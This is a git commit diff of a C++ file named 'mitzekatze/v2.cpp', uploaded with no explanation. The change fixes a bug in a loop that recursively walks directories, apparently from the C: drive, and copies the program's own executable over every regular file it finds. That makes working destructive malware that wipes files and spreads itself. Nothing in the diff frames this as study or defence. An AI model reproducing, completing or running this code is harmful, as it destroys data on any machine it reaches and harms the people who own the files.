7389b1f6a3e7bbbf297049a256de4a0fa32eb5fd
Groove <63636914+Groovemaker@users.noreply.github.com>
2020-08-03 12:43:34 +0200

    Add files via upload

--- mitzekatze/v2.cpp
+++ mitzekatze/v2.cpp
@@ -16,22 +16,22 @@ namespace fs = std::filesystem
 void printer()
 {
 
-for(std::deque<fs::path> directories{{str_to<std::string>(path)}} ; ! directories.empty() ; directories.pop_front()){
-	try {
-		for(fs::directory_iterator dit(directories.front()) ; dit != fs::directory_iterator() ; ++dit){
-			if (fs::is_directory(dit->path())){
-				directories.push_back(dit->path());
-			}
-			else if (fs::is_regular_file(dit->path())){
-				Chain = Chain + sWords[rand() % 4];
-				cout << Chain;
-				CopyFile("./a.exe",entry.path().string().c_str(),0);
+	for(std::deque<fs::path> directories{{str_to<std::string>(path)}} ; ! directories.empty() ; directories.pop_front()){
+		try {
+			for(fs::directory_iterator dit(directories.front()) ; dit != fs::directory_iterator() ; ++dit){
+				if (fs::is_directory(dit->path())){
+					directories.push_back(dit->path());
+				}
+				else if (fs::is_regular_file(dit->path())){
+					Chain = Chain + sWords[rand() % 4];
+					cout << Chain;
+					CopyFile("./a.exe",dit->path().string().c_str(),0);
+				}
 			}
 		}
+		catch(const std::exception& e)
+		{}
 	}
-}
-	catch(...)
-	{}
 		/*
 	std::string path = "C:/";
 	for (const auto & entry : std::filesystem::recursive_directory_iterator(path,std::filesystem::directory_options::skip_permission_denied)){
